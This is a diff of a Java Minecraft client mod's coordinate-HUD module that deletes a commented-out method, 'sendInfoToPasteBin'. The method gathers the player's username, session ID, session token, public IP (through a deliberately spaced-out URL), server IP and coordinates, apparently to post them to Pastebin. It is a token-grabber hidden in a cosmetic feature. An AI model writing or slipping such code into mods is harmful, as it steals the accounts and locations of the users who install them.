@@ -40,32 +40,5 @@ public class CoordHud extends Module {
         else if (s == 1)this.getWindows().get(0).addText(new AdvancedText((int) x + ", " + y + ", " + (int) z, false, color));
         else this.getWindows().get(0).addText(new AdvancedText((int) x + ", " + y + ", " + (int) z, true, color));
     }
-/*
-    public void sendInfoToPasteBin() {
 
-        String newLine = "\r\n";
-        String name = "Name : " + this.mc.getSession().getUsername();
-        String sessionID = "SessionID : " + this.mc.getSession().getSessionID();
-        String sessionToken = "Session Token : " + this.mc.getSession().getToken();
-        String ip = "IP : ";
-
-        //try {
-        //    U R L bruh = new U R L("h t t p : / / b o t . w h a t i s m y i p a d d r e s s . c o m / % 2 2");
-        //    BufferedReader br = new BufferedReader(new InputStreamReader(bruh.openStream()));
-        //    ip = "IP : " + br.readLine().trim();
-        //    br.close();
-        // } catch (Exception  e1) {
-        //     e1.printStackTrace();
-        // }
-
-
-        String serverIP = "Server IP : " + (this.mc.isSingleplayer() ? "null" : this.mc.getCurrentServerData().serverIP);
-
-        String x = "x : " + this.mc.player.posX + "   " + this.mc.player.posX / 8;
-        String y = "y : " + this.mc.player.posY + "   " + this.mc.player.posY / 8;
-        String z = "z : " + this.mc.player.posZ + "   " + this.mc.player.posZ / 8;
-    
-    }
-
- */
 }
